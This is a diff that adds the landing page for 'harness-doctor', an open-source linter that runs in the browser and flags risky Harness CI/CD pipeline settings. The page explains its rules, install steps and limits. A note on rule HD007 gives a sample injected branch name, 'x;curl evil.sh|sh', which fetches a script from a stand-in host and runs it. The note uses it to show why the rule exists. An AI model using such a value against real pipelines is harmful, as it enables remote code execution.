@@ -1,0 +1,362 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>harness-doctor: lint Harness pipelines before prod</title>
+<meta name="description" content="Paste a Harness pipeline and see literal secrets, latest images, script injection and unapproved prod deploys flagged with line numbers. Runs the real linter in your browser.">
+<meta property="og:title" content="harness-doctor">
+<meta property="og:description" content="Lint Harness CI/CD pipelines before they reach production. Try it in the browser.">
+<meta property="og:type" content="website">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%2310b981'/%3E%3Cpath d='M9 16.5l4.5 4.5L23 11' fill='none' stroke='%23052e22' stroke-width='3.2' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E">
+<style>
+:root{--bg:#f8fafc;--panel:#fff;--panel2:#f1f5f9;--line:#e2e8f0;--fg:#0f172a;--mute:#475569;--brand:#047857;--brand-bg:#d1fae5;--err:#b91c1c;--err-bg:#fee2e2;--warn:#b45309;--warn-bg:#fef3c7;--info:#0e7490;--info-bg:#cffafe;--code:#0b1220;--code-fg:#e2e8f0}
+@media (prefers-color-scheme:dark){:root:not([data-theme=light]){--bg:#070d1a;--panel:#0d1526;--panel2:#111c33;--line:#1e2b47;--fg:#e8eefc;--mute:#9fb0cc;--brand:#34d399;--brand-bg:#06382b;--err:#fca5a5;--err-bg:#3b1212;--warn:#fcd34d;--warn-bg:#3a2a07;--info:#67e8f9;--info-bg:#08303a}}
+:root[data-theme=dark]{--bg:#070d1a;--panel:#0d1526;--panel2:#111c33;--line:#1e2b47;--fg:#e8eefc;--mute:#9fb0cc;--brand:#34d399;--brand-bg:#06382b;--err:#fca5a5;--err-bg:#3b1212;--warn:#fcd34d;--warn-bg:#3a2a07;--info:#67e8f9;--info-bg:#08303a}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{margin:0;background:var(--bg);color:var(--fg);font:16px/1.6 system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;-webkit-font-smoothing:antialiased}
+a{color:var(--brand)}
+code,pre,textarea,.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+.wrap{max-width:1080px;margin:0 auto;padding:0 16px}
+nav{position:sticky;top:0;z-index:5;background:color-mix(in srgb,var(--bg) 88%,transparent);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+nav .wrap{display:flex;align-items:center;justify-content:space-between;height:56px;gap:12px}
+.logo{display:flex;align-items:center;gap:10px;font-weight:700;color:var(--fg);text-decoration:none}
+.logo i{width:22px;height:22px;border-radius:6px;background:#10b981;display:inline-grid;place-items:center}
+.logo svg{width:14px;height:14px}
+nav .links{display:flex;gap:18px;align-items:center;font-size:14px}
+nav .links a{color:var(--mute);text-decoration:none}
+nav .links a:hover{color:var(--fg)}
+.btn{display:inline-flex;align-items:center;gap:8px;padding:10px 18px;border-radius:10px;font-weight:600;text-decoration:none;border:1px solid var(--line);color:var(--fg);background:var(--panel);cursor:pointer;font-size:15px}
+.btn.primary{background:#10b981;border-color:#10b981;color:#04281d}
+.btn.primary:hover{background:#34d399}
+.btn:focus-visible,textarea:focus-visible,button:focus-visible,a:focus-visible{outline:2px solid #10b981;outline-offset:2px}
+.hero{padding:72px 0 40px;text-align:center}
+.pill{display:inline-block;font-size:13px;color:var(--brand);background:var(--brand-bg);padding:4px 12px;border-radius:99px;margin-bottom:20px;font-weight:600}
+h1{font-size:clamp(34px,6vw,58px);line-height:1.08;margin:0 0 18px;letter-spacing:-.02em}
+h1 em{font-style:normal;color:var(--brand)}
+.lede{max-width:680px;margin:0 auto 28px;color:var(--mute);font-size:18px}
+.cta{display:flex;gap:12px;justify-content:center;flex-wrap:wrap}
+.stats{display:flex;gap:28px;justify-content:center;flex-wrap:wrap;margin-top:36px;color:var(--mute);font-size:14px}
+.stats b{display:block;color:var(--fg);font-size:22px}
+section{padding:56px 0}
+h2{font-size:clamp(26px,4vw,36px);margin:0 0 8px;letter-spacing:-.01em}
+.sub{color:var(--mute);margin:0 0 28px;max-width:720px}
+.lab{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+@media (max-width:860px){.lab{grid-template-columns:1fr}nav .links .hide-s{display:none}}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:14px;overflow:hidden;min-width:0}
+.card h3{margin:0;padding:12px 16px;font-size:13px;letter-spacing:.06em;text-transform:uppercase;color:var(--mute);border-bottom:1px solid var(--line);display:flex;justify-content:space-between;align-items:center;gap:8px;flex-wrap:wrap}
+.tools{display:flex;gap:6px;flex-wrap:wrap}
+.chip{font:600 12px system-ui;padding:5px 10px;border-radius:8px;border:1px solid var(--line);background:var(--panel2);color:var(--fg);cursor:pointer;text-transform:none;letter-spacing:0}
+.chip[aria-pressed=true]{background:var(--brand-bg);border-color:var(--brand);color:var(--brand)}
+.editor{position:relative;height:440px;background:var(--code)}
+.gutter,#src{margin:0;padding:12px 12px 12px 0;font-size:13px;line-height:20px;tab-size:2;white-space:pre;border:0}
+.gutter{position:absolute;left:0;top:0;bottom:0;width:44px;overflow:hidden;color:#64748b;text-align:right;padding-right:10px;padding-left:0;user-select:none;background:#080e1b;border-right:1px solid #1e293b}
+.gutter .ln{display:block;height:20px}
+.gutter .ln.e{color:#fca5a5;background:#3b1212}
+.gutter .ln.w{color:#fcd34d;background:#3a2a07}
+.gutter .ln.i{color:#67e8f9;background:#08303a}
+#src{position:absolute;inset:0;width:100%;height:100%;padding-left:56px;background:transparent;color:var(--code-fg);resize:none;overflow:auto}
+.out{height:440px;overflow:auto;padding:0}
+.status{padding:14px 16px;font-size:14px;color:var(--mute)}
+.f{padding:12px 16px;border-bottom:1px solid var(--line);display:grid;grid-template-columns:auto 1fr;gap:4px 12px;font-size:14px}
+.f:last-child{border-bottom:0}
+.badge{font:700 11px ui-monospace,monospace;padding:2px 8px;border-radius:6px;height:fit-content}
+.badge.error{background:var(--err-bg);color:var(--err)}
+.badge.warning{background:var(--warn-bg);color:var(--warn)}
+.badge.info{background:var(--info-bg);color:var(--info)}
+.f .msg b{font-family:ui-monospace,monospace;margin-right:6px}
+.f .meta{grid-column:2;color:var(--mute);font-size:13px}
+.f .fix{grid-column:2;font-size:13px}
+.f .fix code{background:var(--panel2);padding:1px 6px;border-radius:5px}
+.f button.jump{all:unset;cursor:pointer;color:var(--brand);text-decoration:underline}
+pre.raw{margin:0;padding:14px 16px;font-size:12.5px;line-height:1.55;white-space:pre-wrap;word-break:break-word}
+.summary{padding:12px 16px;border-top:1px solid var(--line);font-size:14px;display:flex;gap:10px;align-items:center;flex-wrap:wrap;background:var(--panel2)}
+.ok{color:var(--brand);font-weight:600}
+.note{font-size:13px;color:var(--mute);margin-top:12px}
+.steps{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+@media (max-width:860px){.steps{grid-template-columns:1fr}}
+.step{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:20px}
+.step .n{width:28px;height:28px;border-radius:8px;background:var(--brand-bg);color:var(--brand);display:grid;place-items:center;font-weight:700;margin-bottom:10px}
+.step h3{margin:0 0 6px;font-size:17px}
+.step p{margin:0;color:var(--mute);font-size:15px}
+table{width:100%;min-width:620px;border-collapse:collapse;font-size:14px}
+.tw{background:var(--panel);border:1px solid var(--line);border-radius:14px;overflow-x:auto;max-width:100%}
+th,td{text-align:left;padding:12px 14px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-size:12px;letter-spacing:.06em;text-transform:uppercase;color:var(--mute);background:var(--panel2)}
+tr:last-child td{border-bottom:0}
+td:first-child{font-family:ui-monospace,monospace;font-weight:700;white-space:nowrap}
+.install pre{background:var(--code);color:var(--code-fg);padding:16px;border-radius:12px;overflow-x:auto;font-size:13.5px;margin:0 0 12px;position:relative}
+.install .tabs{display:flex;gap:6px;margin-bottom:12px;flex-wrap:wrap}
+.cols2{display:grid;grid-template-columns:minmax(0,1fr) minmax(0,1fr);gap:16px}
+@media (max-width:860px){.cols2{grid-template-columns:minmax(0,1fr)}}
+.limits{background:var(--panel);border:1px solid var(--line);border-left:4px solid #f59e0b;border-radius:10px;padding:16px 20px}
+.limits ul{margin:8px 0 0;padding-left:20px;color:var(--mute)}
+footer{border-top:1px solid var(--line);padding:32px 0;color:var(--mute);font-size:14px}
+footer .wrap{display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap}
+.sr{position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0 0 0 0)}
+</style>
+</head>
+<body>
+<nav><div class="wrap">
+  <a class="logo" href="#top"><i><svg viewBox="0 0 24 24" fill="none" stroke="#052e22" stroke-width="3.4" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12.5l4.5 4.5L19 7"/></svg></i>harness-doctor</a>
+  <div class="links">
+    <a href="#try" class="hide-s">Try it</a>
+    <a href="#rules" class="hide-s">Rules</a>
+    <a href="#install" class="hide-s">Install</a>
+    <a class="btn" href="https://github.com/gerardrecinto/harness-doctor">GitHub</a>
+  </div>
+</div></nav>
+
+<header class="hero" id="top"><div class="wrap">
+  <span class="pill">Open source. MIT. Runs in your browser.</span>
+  <h1>Catch the pipeline mistake <em>before</em> it ships to prod.</h1>
+  <p class="lede">Harness will save a pipeline that deploys to prod with no approval, pulls <code>node:latest</code> and keeps an API token in the YAML. harness-doctor reads it and tells you the line and the fix.</p>
+  <div class="cta">
+    <a class="btn primary" href="#try">Lint a pipeline now</a>
+    <a class="btn" href="#install">Add it to CI</a>
+  </div>
+  <div class="stats">
+    <div><b id="stat-rules">9</b>rules</div>
+    <div><b>4</b>output formats</div>
+    <div><b>0</b>uploads, it runs locally</div>
+  </div>
+</div></header>
+
+<section id="try"><div class="wrap">
+  <h2>Try it on a real pipeline</h2>
+  <p class="sub">This is the actual Python package, loaded into your browser with Pyodide. Edit the YAML and the findings update. Nothing you paste leaves this tab.</p>
+  <div class="lab">
+    <div class="card">
+      <h3><span>pipeline.yaml</span>
+        <span class="tools">
+          <button class="chip" id="ex-bad" aria-pressed="true">Risky example</button>
+          <button class="chip" id="ex-good" aria-pressed="false">Clean example</button>
+        </span>
+      </h3>
+      <div class="editor">
+        <div class="gutter" id="gutter" aria-hidden="true"></div>
+        <label class="sr" for="src">Pipeline YAML</label>
+        <textarea id="src" spellcheck="false" autocapitalize="off" autocomplete="off" wrap="off"></textarea>
+      </div>
+    </div>
+    <div class="card">
+      <h3><span id="out-title">Findings</span>
+        <span class="tools" role="group" aria-label="Output format">
+          <button class="chip" data-fmt="list" aria-pressed="true">Findings</button>
+          <button class="chip" data-fmt="text" aria-pressed="false">Text</button>
+          <button class="chip" data-fmt="json" aria-pressed="false">JSON</button>
+          <button class="chip" data-fmt="sarif" aria-pressed="false">SARIF</button>
+          <button class="chip" data-fmt="github" aria-pressed="false">GitHub</button>
+        </span>
+      </h3>
+      <div class="out" id="out" aria-live="polite"><div class="status" id="boot">Loading the linter (about 10 MB the first time, cached after)...</div></div>
+      <div class="summary" id="summary" hidden></div>
+    </div>
+  </div>
+  <p class="note">The linter checks structure it can see in the YAML. It does not call Harness, resolve templates or runtime inputs, or know which secrets really exist in your account.</p>
+</div></section>
+
+<section><div class="wrap">
+  <h2>How it works</h2>
+  <p class="sub">A rule is one small Python function. No network calls, no account access, no model.</p>
+  <div class="steps">
+    <div class="step"><div class="n">1</div><h3>Parse with line numbers</h3><p>The YAML loader records the line every mapping starts on, so each finding points at the exact spot, even inside templates.</p></div>
+    <div class="step"><div class="n">2</div><h3>Run the rules</h3><p>Each rule walks the stages and steps and yields a line, a message and a fix. A comment on or just above a line silences one rule.</p></div>
+    <div class="step"><div class="n">3</div><h3>Report where you work</h3><p>Plain text for the terminal, SARIF for code scanning, JSON for scripts, and inline annotations on the pull request diff.</p></div>
+  </div>
+</div></section>
+
+<section id="rules"><div class="wrap">
+  <h2>What it catches</h2>
+  <p class="sub">The rule list below is read from the running package, so it cannot drift from the code.</p>
+  <div class="tw"><table><thead><tr><th>Rule</th><th>Severity</th><th>Check</th><th>Why it matters</th></tr></thead><tbody id="rules-body"><tr><td colspan="4">Loading...</td></tr></tbody></table></div>
+  <p class="note">HD007 is the one most teams miss. Harness substitutes <code>&lt;+codebase.branch&gt;</code> into the script text before the shell parses it, so a branch named <code>x;curl evil.sh|sh</code> runs as code.</p>
+</div></section>
+
+<section id="install" class="install"><div class="wrap">
+  <h2>Put it in the path of every change</h2>
+  <p class="sub">Run it locally, as a GitHub Action with findings in the Security tab, or as a pre-commit hook.</p>
+  <div class="cols2">
+    <div>
+      <pre>pip install "harness-doctor[schema] @ \
+  git+https://github.com/gerardrecinto/harness-doctor"
+
+harness-doctor check .harness
+harness-doctor check .harness --fail-on warning
+harness-doctor check .harness --format sarif
+harness-doctor explain HD007</pre>
+      <p class="note">Exit codes: 0 clean, 1 findings at or above <code>--fail-on</code>, 2 bad input.</p>
+    </div>
+    <div>
+      <pre>- uses: actions/checkout@v4
+- uses: gerardrecinto/harness-doctor@main
+  with:
+    path: .harness
+    fail-on: warning
+    schema: "true"</pre>
+      <p class="note">There is also an OPA policy, <code>policies/pipeline_guardrails.rego</code>, that enforces the image, timeout and prod-approval rules inside Harness when a pipeline is saved.</p>
+    </div>
+  </div>
+</div></section>
+
+<section><div class="wrap">
+  <div class="limits">
+    <strong>What this does not do</strong>
+    <ul>
+      <li>It is a linter. It does not prove a pipeline is safe, only that these nine patterns are absent.</li>
+      <li>It reads one file at a time. It does not resolve templates, runtime inputs or account-level policy.</li>
+      <li>A secret that does not look like a secret by name or format will not be flagged.</li>
+    </ul>
+  </div>
+</div></section>
+
+<footer><div class="wrap">
+  <span>harness-doctor. MIT licensed. Built by <a href="https://github.com/gerardrecinto">Gerard Recinto</a>.</span>
+  <span><a href="https://github.com/gerardrecinto/harness-doctor">Source</a> &middot; <a href="https://github.com/gerardrecinto/harness-doctor/releases">Releases</a> &middot; <a href="https://github.com/gerardrecinto/harness-doctor/blob/main/CHANGELOG.md">Changelog</a></span>
+</div></footer>
+
+<script src="https://cdn.jsdelivr.net/pyodide/v0.26.4/full/pyodide.js"></script>
+<script>
+(() => {
+  const PY_FILES = ["__init__.py", "model.py", "rules.py", "engine.py", "report.py"];
+  const $ = (id) => document.getElementById(id);
+  const src = $("src"), gutter = $("gutter"), out = $("out"), summary = $("summary");
+  const esc = (s) => String(s).replace(/[&<>"]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c]));
+  const examples = {};
+  let py = null, fmt = "list", timer = null, last = null;
+
+  function track(name) { try { if (window.plausible) window.plausible(name); } catch (e) {} }
+
+  function drawGutter(findings) {
+    const n = src.value.split("\n").length;
+    const sev = {};
+    (findings || []).forEach((f) => {
+      const c = f.severity[0];
+      if (!sev[f.line] || "eiw".indexOf(c) < "eiw".indexOf(sev[f.line])) sev[f.line] = c;
+    });
+    let h = "";
+    for (let i = 1; i <= n; i++) h += `<span class="ln ${sev[i] || ""}">${i}</span>`;
+    gutter.innerHTML = h;
+    gutter.scrollTop = src.scrollTop;
+  }
+
+  function render() {
+    if (!last) return;
+    const { findings, text, json, sarif, github, error } = last;
+    drawGutter(findings);
+    summary.hidden = false;
+    if (error) {
+      out.innerHTML = `<div class="status" style="color:var(--err)">${esc(error)}</div>`;
+      summary.innerHTML = "The YAML did not parse, so nothing was checked.";
+      return;
+    }
+    const c = { error: 0, warning: 0, info: 0 };
+    findings.forEach((f) => c[f.severity]++);
+    summary.innerHTML = findings.length
+      ? `<span class="badge error">${c.error} error${c.error === 1 ? "" : "s"}</span><span class="badge warning">${c.warning} warning${c.warning === 1 ? "" : "s"}</span><span class="badge info">${c.info} info</span><span>${c.error ? "Would fail CI at the default threshold (error)." : "Would pass CI at the default threshold (error)."}</span>`
+      : `<span class="ok">No findings.</span><span>Would pass CI.</span>`;
+    if (fmt === "list") {
+      out.innerHTML = findings.length
+        ? findings.map((f) => `<div class="f"><span class="badge ${f.severity}">${f.severity.toUpperCase()}</span><div class="msg"><b>${f.rule}</b>${esc(f.message)}</div><div class="meta">line <button class="jump" data-line="${f.line}">${f.line}</button></div>${f.hint ? `<div class="fix">Fix: <code>${esc(f.hint)}</code></div>` : ""}</div>`).join("")
+        : `<div class="status ok">Nothing to flag in this file.</div>`;
+    } else {
+      const body = { text, json, sarif, github }[fmt] || "";
+      out.innerHTML = `<pre class="raw">${esc(body || "(no output)")}</pre>`;
+    }
+  }
+
+  const PY_RUN = `
+import json, sys, importlib
+from pathlib import Path
+import yaml
+from harness_doctor.engine import check_file
+from harness_doctor import report
+def run(text):
+    p = Path("/work/pipeline.yaml")
+    p.parent.mkdir(exist_ok=True)
+    p.write_text(text)
+    try:
+        findings = check_file(p)
+    except yaml.YAMLError as e:
+        return json.dumps({"error": "YAML error: " + str(e).split("\\n")[0] + ". " + (str(e.problem_mark) if getattr(e, "problem_mark", None) else "")})
+    except Exception as e:
+        return json.dumps({"error": type(e).__name__ + ": " + str(e)})
+    out = {"findings": [f.__dict__ for f in findings]}
+    for k in ("text", "json", "sarif", "github"):
+        out[k] = report.FORMATS[k](findings, 1)
+    return json.dumps(out)
+def rules():
+    from harness_doctor.rules import RULES
+    return json.dumps([{"id": r.id, "severity": r.severity, "title": r.title, "why": r.why} for r in RULES.values()])
+`;
+
+  async function boot() {
+    try {
+      py = await loadPyodide();
+      await py.loadPackage("pyyaml");
+      py.FS.mkdirTree("/lib/harness_doctor");
+      await Promise.all(PY_FILES.map(async (f) => {
+        const r = await fetch("py/" + f);
+        if (!r.ok) throw new Error("could not load " + f);
+        py.FS.writeFile("/lib/harness_doctor/" + f, await r.text());
+      }));
+      py.runPython("import sys; sys.path.insert(0, '/lib')");
+      py.runPython(PY_RUN);
+      const rs = JSON.parse(py.runPython("rules()"));
+      $("stat-rules").textContent = rs.length;
+      $("rules-body").innerHTML = rs.map((r) => `<tr><td>${r.id}</td><td><span class="badge ${r.severity}">${r.severity}</span></td><td>${esc(r.title)}</td><td>${esc(r.why)}</td></tr>`).join("");
+      window.__HD_READY__ = true;
+      lint();
+    } catch (e) {
+      $("boot").textContent = "The in-browser linter did not load (" + e.message + "). The CLI install below works the same way.";
+      $("rules-body").innerHTML = '<tr><td colspan="4">The rule list loads with the linter. See the README for the full table.</td></tr>';
+    }
+  }
+
+  function lint() {
+    if (!py) return;
+    try {
+      py.globals.set("_in", src.value);
+      last = JSON.parse(py.runPython("run(_in)"));
+    } catch (e) {
+      last = { error: String(e.message || e).split("\n").pop() };
+    }
+    render();
+  }
+
+  src.addEventListener("input", () => { drawGutter(last && last.findings); clearTimeout(timer); timer = setTimeout(() => { lint(); track("hd_edit"); }, 250); });
+  src.addEventListener("scroll", () => { gutter.scrollTop = src.scrollTop; });
+
+  document.querySelectorAll("[data-fmt]").forEach((b) => b.addEventListener("click", () => {
+    fmt = b.dataset.fmt;
+    document.querySelectorAll("[data-fmt]").forEach((x) => x.setAttribute("aria-pressed", x === b));
+    render(); track("hd_format_" + fmt);
+  }));
+  out.addEventListener("click", (e) => {
+    const j = e.target.closest(".jump");
+    if (!j) return;
+    const line = +j.dataset.line;
+    const pos = src.value.split("\n").slice(0, line - 1).join("\n").length + (line > 1 ? 1 : 0);
+    src.focus();
+    src.setSelectionRange(pos, pos + (src.value.split("\n")[line - 1] || "").length);
+    src.scrollTop = Math.max(0, (line - 4) * 20);
+  });
+
+  async function setExample(name) {
+    src.value = examples[name];
+    $("ex-bad").setAttribute("aria-pressed", name === "bad");
+    $("ex-good").setAttribute("aria-pressed", name === "good");
+    drawGutter(null); lint(); track("hd_example_" + name);
+  }
+  $("ex-bad").addEventListener("click", () => setExample("bad"));
+  $("ex-good").addEventListener("click", () => setExample("good"));
+
+  Promise.all(["bad", "good"].map((n) => fetch(`examples/${n}.yaml`).then((r) => r.text()).then((t) => { examples[n] = t; }))).then(() => {
+    src.value = examples.bad; drawGutter(null); if (py) lint();
+  }).catch(() => { src.value = "# could not load the example\n"; });
+  boot();
+})();
+</script>
+</body>
+</html>
